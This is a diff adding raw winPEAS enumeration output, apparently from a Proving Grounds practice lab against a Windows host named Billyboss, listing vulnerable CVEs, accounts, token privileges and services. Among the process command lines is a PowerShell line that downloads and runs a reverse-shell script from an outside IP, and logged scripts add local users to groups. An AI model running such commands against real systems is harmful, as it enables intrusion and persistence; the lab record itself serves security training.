@@ -1,0 +1,1920 @@
+root@kali:~/CTF/PGPractice/Billyboss/PE# cat winpeas.txt
+ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+
+             *((,.,/((((((((((((((((((((/,  */
+      ,/*,..*((((((((((((((((((((((((((((((((((,
+    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*
+    ((((((((((((((((**********/########## .(* ,(((((((
+    (((((((((((/********************/####### .(. (((((((
+    ((((((..******************/@@@@@/***/###### ./(((((((
+    ,,....********************@@@@@@@@@@(***,#### .//((((((
+    , ,..********************/@@@@@%@@@@/********##((/ /((((
+    ..((###########*********/%@@@@@@@@@/************,,..((((
+    .(##################(/******/@@@@@/***************.. /((
+    .(#########################(/**********************..*((
+    .(##############################(/*****************.,(((
+    .(###################################(/************..(((
+    .(#######################################(*********..(((
+    .(#######(,.***.,(###################(..***.*******..(((
+    .(#######*(#####((##################((######/(*****..(((
+    .(###################(/***********(##############(...(((
+    .((#####################/*******(################.((((((
+    .(((############################################(..((((
+    ..(((##########################################(..(((((
+    ....((########################################( .(((((
+    ......((####################################( .((((((
+    (((((((((#################################(../((((((
+        (((((((((/##########################(/..((((((
+              (((((((((/,.  ,*//////*,. ./(((((((((((((((.
+                 (((((((((((((((((((((((((((((/
+
+ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+  WinPEAS v2.0-beta by @carlospolopm, makikvues(makikvues2[at]gmail[dot]com)
+
+       /---------------------------------------------------------------------------\
+       |                             Do you like PEASS?                            |
+       |---------------------------------------------------------------------------|
+       |         Become a Patreon    :     https://www.patreon.com/peass           |
+       |         Follow on Twitter   :     @carlospolopm                           |
+       |---------------------------------------------------------------------------|
+       |                                 Thank you!                                |
+       \---------------------------------------------------------------------------/
+
+  [+] Legend:
+         Red                Indicates a special privilege over an object or something is misconfigured
+         Green              Indicates that some protection is enabled or something is well configured
+         Cyan               Indicates active users
+         Blue               Indicates disabled users
+         LightYellow        Indicates links
+
+   [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
+   Creating Dynamic lists, this could take a while, please wait...
+   - Checking if domain...
+   - Getting Win32_UserAccount info...
+   - Creating current user groups list...
+   - Creating active users list (local only)...
+   - Creating disabled users list...
+   - Admin users list...
+   - Creating AppLocker bypass list...
+   - Creating files/directories list for search...
+
+
+  ==========================================(System Information)==========================================
+
+  [+] Basic System Information
+   [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
+    Hostname: billyboss
+    ProductName: Windows 10 Pro
+    EditionID: Professional
+    ReleaseId: 1903
+    BuildBranch: 19h1_release
+    CurrentMajorVersionNumber: 10
+    CurrentVersion: 6.3
+    Architecture: AMD64
+    ProcessorCount: 1
+    SystemLang: en-US
+    KeyboardLang: English (United States)
+    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
+    IsVirtualMachine: True
+    Current Time: 7/3/2021 5:06:23 AM
+    HighIntegrity: False
+    PartOfDomain: False
+    Hotfixes: KB4552931, KB4497165, KB4497727, KB4537759, KB4552152, KB4540673,
+
+  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+ [*] OS Version: 1903 (18362)
+ [*] Enumerating installed KBs...
+ [!] CVE-2019-1064 : VULNERABLE
+  [>] https://www.rythmstick.net/posts/cve-2019-1064/
+
+ [!] CVE-2019-1130 : VULNERABLE
+  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear
+
+ [!] CVE-2019-1253 : VULNERABLE
+  [>] https://github.com/padovah4ck/CVE-2019-1253
+  [>] https://github.com/sgabe/CVE-2019-1253
+
+ [!] CVE-2019-1315 : VULNERABLE
+  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
+
+ [!] CVE-2019-1385 : VULNERABLE
+  [>] https://www.youtube.com/watch?v=K6gHnr-VkAg
+
+ [!] CVE-2019-1388 : VULNERABLE
+  [>] https://github.com/jas502n/CVE-2019-1388
+
+ [!] CVE-2019-1405 : VULNERABLE
+  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
+  [>] https://github.com/apt69/COMahawk
+
+ [!] CVE-2020-0668 : VULNERABLE
+  [>] https://github.com/itm4n/SysTracingPoc
+
+ [!] CVE-2020-0683 : VULNERABLE
+  [>] https://github.com/padovah4ck/CVE-2020-0683
+  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1
+
+ [*] Finished. Found 9 potential vulnerabilities.
+
+
+  [+] Showing All Microsoft Updates
+  [X] Exception: Exception has been thrown by the target of an invocation.
+
+  [+] System Last Shutdown Date/time (from Registry)
+
+    Last Shutdown Date/time        :    7/12/2020 11:43:14 PM
+
+  [+] User Environment Variables
+   [?] Check for some passwords or keys in the env variables
+    COMPUTERNAME: BILLYBOSS
+    USERPROFILE: C:\Users\nathan
+    PUBLIC: C:\Users\Public
+    LOCALAPPDATA: C:\Users\nathan\AppData\Local
+    PSModulePath: C:\Users\nathan\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+    PROCESSOR_ARCHITECTURE: AMD64
+    Path: C:\Users\nathan\Nexus\nexus-3.21.0-05\bin\..\lib;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\dotnet\;C:\Program Files (x86)\dotnet\;C:\Users\nathan\AppData\Local\Microsoft\WindowsApps;c:\users\nathan\nexus\nexus-3.21.0-05\jre\bin
+    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
+    ProgramFiles(x86): C:\Program Files (x86)
+    PROCESSOR_LEVEL: 23
+    ProgramFiles: C:\Program Files
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+    PSExecutionPolicyPreference: Bypass
+    SystemRoot: C:\Windows
+    ALLUSERSPROFILE: C:\ProgramData
+    DriverData: C:\Windows\System32\Drivers\DriverData
+    ProgramData: C:\ProgramData
+    PROCESSOR_REVISION: 0102
+    USERNAME: nathan
+    CommonProgramW6432: C:\Program Files\Common Files
+    OneDrive: C:\Users\nathan\OneDrive
+    CommonProgramFiles: C:\Program Files\Common Files
+    OS: Windows_NT
+    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
+    ComSpec: C:\Windows\system32\cmd.exe
+    SystemDrive: C:
+    TEMP: C:\Users\nathan\AppData\Local\Temp
+    NUMBER_OF_PROCESSORS: 1
+    APPDATA: C:\Users\nathan\AppData\Roaming
+    TMP: C:\Users\nathan\AppData\Local\Temp
+    ProgramW6432: C:\Program Files
+    windir: C:\Windows
+    USERDOMAIN: BILLYBOSS
+
+  [+] System Environment Variables
+   [?] Check for some passwords or keys in the env variables
+    ComSpec: C:\Windows\system32\cmd.exe
+    DriverData: C:\Windows\System32\Drivers\DriverData
+    OS: Windows_NT
+    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\dotnet\;C:\Program Files (x86)\dotnet\
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+    PROCESSOR_ARCHITECTURE: AMD64
+    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+    TEMP: C:\Windows\TEMP
+    TMP: C:\Windows\TEMP
+    USERNAME: SYSTEM
+    windir: C:\Windows
+    NUMBER_OF_PROCESSORS: 1
+    PROCESSOR_LEVEL: 23
+    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
+    PROCESSOR_REVISION: 0102
+
+  [+] Audit Settings
+   [?] Check what is being logged
+    Not Found
+
+  [+] Audit Policy Settings - Classic & Advanced
+
+  [+] WEF Settings
+   [?] Windows Event Forwarding, is interesting to know were are sent the logs
+    Not Found
+
+  [+] LAPS Settings
+   [?] If installed, local administrator password is changed frequently and is restricted by ACL
+    LAPS Enabled: LAPS not installed
+
+  [+] Wdigest
+   [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
+    Wdigest is not enabled
+
+  [+] LSA Protection
+   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
+    LSA Protection is not enabled
+
+  [+] Credentials Guard
+   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
+    CredentialGuard is not enabled
+    Virtualization Based Security Status:      Not enabled
+    Configured:                                False
+    Running:                                   False
+
+  [+] Cached Creds
+   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
+    cachedlogonscount is 10
+
+  [+] AV Information
+    Some AV was detected, search for bypasses
+    Name: Windows Defender
+    ProductEXE: windowsdefender://
+    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe
+
+  [+] Windows Defender configuration
+  Local Settings
+  Group Policy Settings
+
+  [+] UAC Status
+   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
+    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
+    EnableLUA: 1
+    LocalAccountTokenFilterPolicy:
+    FilterAdministratorToken:
+      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
+      [-] Only the RID-500 local admin account can be used for lateral movement.
+
+  [+] PowerShell Settings
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.1.18362.1
+    PowerShell Core Version:
+    Transcription Settings:
+    Module Logging Settings:
+    Scriptblock Logging Settings:
+    PS history file: C:\Users\nathan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    PS history size: 112B
+
+  [+] Enumerating PowerShell Session Settings using the registry
+      You must be an administrator to run this check
+
+  [+] PS default transcripts history
+    [i] Read the PS history inside these files (if any)
+
+  [+] HKCU Internet Settings
+    DisableCachingOfSSLPages: 0
+    IE5_UA_Backup_Flag: 5.0
+    PrivacyAdvanced: 1
+    SecureProtocols: 2688
+    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+    CertificateRevocation: 1
+    ZonesSecurityUpgrade: System.Byte[]
+    WarnonZoneCrossing: 0
+    EnableNegotiate: 1
+    MigrateProxy: 1
+    ProxyEnable: 0
+    LockDatabase: 132348964719060600
+
+  [+] HKLM Internet Settings
+    ActiveXCache: C:\Windows\Downloaded Program Files
+    CodeBaseSearchPath: CODEBASE
+    EnablePunycode: 1
+    MinorVersion: 0
+    WarnOnIntranet: 1
+
+  [+] Drives Information
+   [?] Remember that you should search more info inside the other drives
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 6 GB)(Permissions: Authenticated Users [AppendData/CreateDirectories])
+    D:\ (Type: CDRom)
+
+  [+] Checking WSUS
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
+    Not Found
+
+  [+] Checking AlwaysInstallElevated
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated isn't available
+
+  [+] Enumerate LSA settings - auth packages included
+
+    auditbasedirectories                 :       0
+    auditbaseobjects                     :       0
+    Bounds                               :       00-30-00-00-00-20-00-00
+    crashonauditfail                     :       0
+    fullprivilegeauditing                :       00
+    LimitBlankPasswordUse                :       1
+    NoLmHash                             :       1
+    Security Packages                    :       ""
+    Notification Packages                :       scecli
+    Authentication Packages              :       msv1_0
+    LsaPid                               :       592
+    LsaCfgFlagsDefault                   :       0
+    SecureBoot                           :       1
+    ProductType                          :       6
+    disabledomaincreds                   :       0
+    everyoneincludesanonymous            :       0
+    forceguest                           :       0
+    restrictanonymous                    :       0
+    restrictanonymoussam                 :       1
+
+  [+] Enumerating NTLM Settings
+  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
+
+
+  NTLM Signing Settings
+      ClientRequireSigning    : False
+      ClientNegotiateSigning  : True
+      ServerRequireSigning    : False
+      ServerNegotiateSigning  : False
+      LdapSigning             : Negotiate signing (Negotiate signing)
+
+  Session Security
+      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
+      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
+
+
+  NTLM Auditing and Restrictions
+      InboundRestrictions     :  (Not defined)
+      OutboundRestrictions    :  (Not defined)
+      InboundAuditing         :  (Not defined)
+      OutboundExceptions      :
+
+  [+] Display Local Group Policy settings - local users/machine
+
+  [+] Checking AppLocker effective policy
+   AppLockerPolicy version: 1
+   listing rules:
+
+
+  [X] Exception: Object reference not set to an instance of an object.
+
+  [+] Enumerating Printers (WMI)
+      Name:                    Microsoft XPS Document Writer
+      Status:                  Unknown
+      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-2389609380-2620298947-1153829925-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-2389609380-2620298947-1153829925-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
+      Is default:              False
+      Is network printer:      False
+
+   =================================================================================================
+
+      Name:                    Microsoft Print to PDF
+      Status:                  Unknown
+      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-2389609380-2620298947-1153829925-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-2389609380-2620298947-1153829925-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
+      Is default:              True
+      Is network printer:      False
+
+   =================================================================================================
+
+      Name:                    Fax
+      Status:                  Unknown
+      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-2389609380-2620298947-1153829925-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-2389609380-2620298947-1153829925-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
+      Is default:              False
+      Is network printer:      False
+
+   =================================================================================================
+
+
+  [+] Enumerating Named Pipes
+  Name                                                                                                 Sddl
+
+  eventlog                                                                                             O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
+
+  ROUTER                                                                                               O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)
+
+  vgauth-service                                                                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
+
+
+  [+] Enumerating AMSI registered providers
+    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
+    Path:           "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2005.4-0\MpOav.dll"
+
+   =================================================================================================
+
+
+  [+] Enumerating Sysmon configuration
+      You must be an administrator to run this check
+
+  [+] Enumerating Sysmon process creation logs (1)
+      You must be an administrator to run this check
+
+  [+] Installed .NET versions
+
+  CLR Versions
+   4.0.30319
+
+  .NET Versions
+   4.8.03752
+
+  .NET & AMSI (Anti-Malware Scan Interface) support
+      .NET version supports AMSI     : True
+      OS supports AMSI               : True
+        [!] The highest .NET version is enrolled in AMSI!
+
+
+  ==============================(Interesting Events information)==============================
+
+  [+] Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials
+
+      You must be an administrator to run this check
+
+  [+] Printing Account Logon Events (4624) for the last 10 days.
+
+      You must be an administrator to run this check
+
+  [+] Process creation events - searching logs (EID 4688) for sensitive data.
+
+      You must be an administrator to run this check
+
+  [+] PowerShell events - script block logs (EID 4104) - searching for sensitive data.
+
+   User Id         :        S-1-5-21-2389609380-2620298947-1153829925-1001
+   Event Id        :        4104
+   Context         :        else {
+}
+}
+net_regiis.exe to use (it works with older versions)
+$AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1
+# Check if aspnet_regiis.exe exists
+if (Test-Path  ($AspnetRegiisPath.FullName)) {
+   Created At      :        7/3/2021 5:04:57 AM
+   Command line    :        net_regiis.exe to use (it works with older versions)
+
+   =================================================================================================
+
+   User Id         :        S-1-5-21-2389609380-2620298947-1153829925-1001
+   Event Id        :        4104
+   Context         :        # create a local user and add it to the local specified group
+else {
+}
+net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
+}
+}
+# generate with base64 -w 0 hijack32.dll > hijack32.b64
+   Created At      :        7/3/2021 5:04:57 AM
+   Command line    :        net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
+
+   =================================================================================================
+
+   User Id         :        S-1-5-21-2389609380-2620298947-1153829925-1001
+   Event Id        :        4104
+   Context         :        # create a local user and add it to the local specified group
+else {
+}
+net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
+}
+}
+}
+   Created At      :        7/3/2021 5:04:57 AM
+   Command line    :        net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
+
+   =================================================================================================
+
+   User Id         :        S-1-5-21-2389609380-2620298947-1153829925-1001
+   Event Id        :        4104
+   Context         :        # create a local user and add it to the local specified group
+else {
+}
+net user $UserNameToAdd $PasswordToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")
+}
+}
+}
+   Created At      :        7/3/2021 5:04:57 AM
+   Command line    :        net user $UserNameToAdd $PasswordToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")
+
+   =================================================================================================
+
+   User Id         :        S-1-5-21-2389609380-2620298947-1153829925-1001
+   Event Id        :        4104
+   Context         :        .EXAMPLE
+The new binary path (lpBinaryPathName) to set for the specified service. Required.
+.PARAMETER Path
+net user john Password123! /add'
+Sets the binary path for 'VulnSvc' to be a command to add a user.
+.EXAMPLE
+Get-Service VulnSvc | Set-ServiceBinaryPath -Path 'net user john Password123! /add'
+   Created At      :        7/3/2021 5:04:57 AM
+   Command line    :        net user john Password123! /add'
+
+   =================================================================================================
+
+
+  [+] Displaying Power off/on events for last 5 days
+
+
+
+  ===========================================(Users Information)===========================================
+
+  [+] Users
+   [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
+  Current user: nathan
+  Current groups: Domain Users, Everyone, Users, Service, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
+   =================================================================================================
+
+    BILLYBOSS\Administrator: Built-in account for administering the computer/domain
+        |->Groups: Administrators
+        |->Password: CanChange-NotExpi-Req
+
+    BILLYBOSS\DefaultAccount(Disabled): A user account managed by the system.
+        |->Groups: System Managed Accounts Group
+        |->Password: CanChange-NotExpi-NotReq
+
+    BILLYBOSS\Guest(Disabled): Built-in account for guest access to the computer/domain
+        |->Groups: Guests
+        |->Password: NotChange-NotExpi-NotReq
+
+    BILLYBOSS\nathan
+        |->Password: CanChange-NotExpi-NotReq
+
+    BILLYBOSS\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
+        |->Password: CanChange-Expi-Req
+
+
+  [+] Current User Idle Time
+   Current User   :     BILLYBOSS\nathan
+   Idle Time      :     02h:52m:20s:390ms
+
+  [+] Display Tenant information (DsRegCmd.exe /status)
+   Tenant is NOT Azure AD Joined.
+
+  [+] Current Token privileges
+   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
+    SeShutdownPrivilege: DISABLED
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeUndockPrivilege: DISABLED
+    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeIncreaseWorkingSetPrivilege: DISABLED
+    SeTimeZonePrivilege: DISABLED
+
+  [+] Clipboard text
+
+  [+] Logged users
+    IIS APPPOOL\BaGet
+    BILLYBOSS\nathan
+
+  [+] Display information about local users
+   Computer Name           :   BILLYBOSS
+   User Name               :   Administrator
+   User Id                 :   500
+   Is Enabled              :   True
+   User Type               :   Administrator
+   Comment                 :   Built-in account for administering the computer/domain
+   Last Logon              :   7/3/2021 2:30:25 AM
+   Logons Count            :   27
+   Password Last Set       :   5/28/2020 10:15:19 PM
+
+   =================================================================================================
+
+   Computer Name           :   BILLYBOSS
+   User Name               :   DefaultAccount
+   User Id                 :   503
+   Is Enabled              :   False
+   User Type               :   Guest
+   Comment                 :   A user account managed by the system.
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   1/1/1970 12:00:00 AM
+
+   =================================================================================================
+
+   Computer Name           :   BILLYBOSS
+   User Name               :   Guest
+   User Id                 :   501
+   Is Enabled              :   False
+   User Type               :   Guest
+   Comment                 :   Built-in account for guest access to the computer/domain
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   1/1/1970 12:00:00 AM
+
+   =================================================================================================
+
+   Computer Name           :   BILLYBOSS
+   User Name               :   nathan
+   User Id                 :   1001
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   4/21/2021 9:07:10 AM
+   Logons Count            :   35
+   Password Last Set       :   5/28/2020 10:15:19 PM
+
+   =================================================================================================
+
+   Computer Name           :   BILLYBOSS
+   User Name               :   WDAGUtilityAccount
+   User Id                 :   504
+   Is Enabled              :   False
+   User Type               :   Guest
+   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   5/25/2020 8:55:49 AM
+
+   =================================================================================================
+
+
+  [+] RDP Sessions
+    Not Found
+
+  [+] Ever logged users
+    IIS APPPOOL\BaGet
+    BILLYBOSS\Administrator
+    BILLYBOSS\nathan
+
+  [+] Home folders found
+    C:\Users\Administrator
+    C:\Users\All Users
+    C:\Users\BaGet
+    C:\Users\Default
+    C:\Users\Default User
+    C:\Users\nathan : nathan [AllAccess]
+    C:\Users\Public : Service [WriteData/CreateFiles]
+
+  [+] Looking for AutoLogon credentials
+    Not Found
+
+  [+] Password Policies
+   [?] Check for a possible brute-force
+    Domain: Builtin
+    SID: S-1-5-32
+    MaxPasswordAge: 42.22:47:31.7437440
+    MinPasswordAge: 00:00:00
+    MinPasswordLength: 0
+    PasswordHistoryLength: 0
+    PasswordProperties: 0
+   =================================================================================================
+
+    Domain: BILLYBOSS
+    SID: S-1-5-21-2389609380-2620298947-1153829925
+    MaxPasswordAge: 42.00:00:00
+    MinPasswordAge: 00:00:00
+    MinPasswordLength: 0
+    PasswordHistoryLength: 0
+    PasswordProperties: 0
+   =================================================================================================
+
+
+  [+] Print Logon Sessions
+    Method:                       WMI
+    Logon Server:
+    Logon Server Dns Domain:
+    Logon Id:                     115134
+    Logon Time:
+    Logon Type:                   Service
+    Start Time:                   4/21/2021 9:07:10 AM
+    Domain:                       BILLYBOSS
+    Authentication Package:       NTLM
+    Start Time:                   4/21/2021 9:07:10 AM
+    User Name:                    nathan
+    User Principal Name:
+    User SID:
+
+   =================================================================================================
+
+
+
+  =======================================(Processes Information)=======================================
+
+  [+] Interesting Processes -non Microsoft-
+   [?] Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
+    powershell(4424)[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: nathan
+    Command Line: powershell.exe IEX(IWR 192.168.49.98/rshell.ps1 -UseBasicParsing)
+   =================================================================================================
+
+    nexus(2100)[C:\Users\nathan\Nexus\nexus-3.21.0-05\bin\nexus.exe] -- POwn: nathan
+    Possible DLL Hijacking folder: C:\Users\nathan\Nexus\nexus-3.21.0-05\bin (nathan [AllAccess])
+    Command Line: C:\Users\nathan\Nexus\nexus-3.21.0-05\bin\nexus.exe "Sonatype Nexus" __i4j_restart
+   =================================================================================================
+
+    winPEASany(5032)[C:\Users\nathan\Downloads\winPEASany.exe] -- POwn: nathan -- isDotNet
+    Permissions: nathan [AllAccess]
+    Possible DLL Hijacking folder: C:\Users\nathan\Downloads (nathan [AllAccess])
+    Command Line: "C:\Users\nathan\Downloads\winPEASany.exe"
+   =================================================================================================
+
+    nexus(1272)[C:\Users\nathan\Nexus\nexus-3.21.0-05\bin\nexus.exe] -- POwn: nathan
+    Possible DLL Hijacking folder: C:\Users\nathan\Nexus\nexus-3.21.0-05\bin (nathan [AllAccess])
+    Command Line: "C:\Users\nathan\Nexus\nexus-3.21.0-05\bin\nexus.exe"
+   =================================================================================================
+
+    conhost(3384)[C:\Windows\system32\conhost.exe] -- POwn: nathan
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+
+
+  ========================================(Services Information)========================================
+
+  [+] Interesting Services -non Microsoft-
+   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    Sonatype Nexus(Sonatype Nexus)["C:\Users\nathan\Nexus\nexus-3.21.0-05\bin\nexus.exe"] - Auto - Running
+    Possible DLL Hijacking in binary folder: C:\Users\nathan\Nexus\nexus-3.21.0-05\bin (nathan [AllAccess])
+   =================================================================================================
+
+    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
+    Agent to hold private keys used for public key authentication.
+   =================================================================================================
+
+    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
+    Alias Manager and Ticket Service
+   =================================================================================================
+
+    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
+    Provides support for synchronizing objects between the host and guest operating systems.
+   =================================================================================================
+
+    VMwareCAFCommAmqpListener(VMware CAF AMQP Communication Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"] - Manual - Stopped
+    VMware Common Agent AMQP Communication Service
+   =================================================================================================
+
+    VMwareCAFManagementAgentHost(VMware CAF Management Agent Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"] - Manual - Stopped
+    VMware Common Agent Management Agent Service
+   =================================================================================================
+
+
+  [+] Modifiable Services
+   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    You cannot modify any service
+
+  [+] Looking if you can modify any service registry
+   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
+    [-] Looks like you cannot change the registry of any service...
+
+  [+] Checking write permissions in PATH folders (DLL Hijacking)
+   [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
+    C:\Windows\system32
+    C:\Windows
+    C:\Windows\System32\Wbem
